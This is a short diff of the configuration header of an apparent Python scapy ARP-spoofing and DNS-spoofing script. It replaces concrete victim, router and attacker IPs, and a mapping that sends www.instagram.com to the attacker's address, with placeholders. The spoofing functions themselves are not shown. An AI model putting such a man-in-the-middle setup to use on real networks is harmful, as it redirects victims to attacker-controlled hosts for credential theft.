@@ -6,18 +6,18 @@ from scapy.layers.l2 import ARP
 import threading
 
 # Target IP and MAC addresses
-victim_ip = "192.168.56.11"
+victim_ip = "TARGET_VICTIM_IP"
 victim_mac = "TARGET_VICTIM_MAC"
-router_ip = "10.0.0.1"
+router_ip = "ROUTER_IP"
 router_mac = "ROUTER_MAC"
-attacker_ip = "192.168.56.12"  # IP of the attacker's machine
+attacker_ip = "ATTACKER_IP"  # IP of the attacker's machine
 
 # Interface to use for the attack
 interface = "eth0"
 
 # Malicious DNS records
 malicious_dns_records = {
-    "www.instagram.com": "192.168.56.12"  # Replace with the domain and malicious IP
+    "DOMAIN_NAME": "ATTACKER_IP"  # Replace with the domain and malicious IP
 }
 
 # Function to perform ARP spoofing
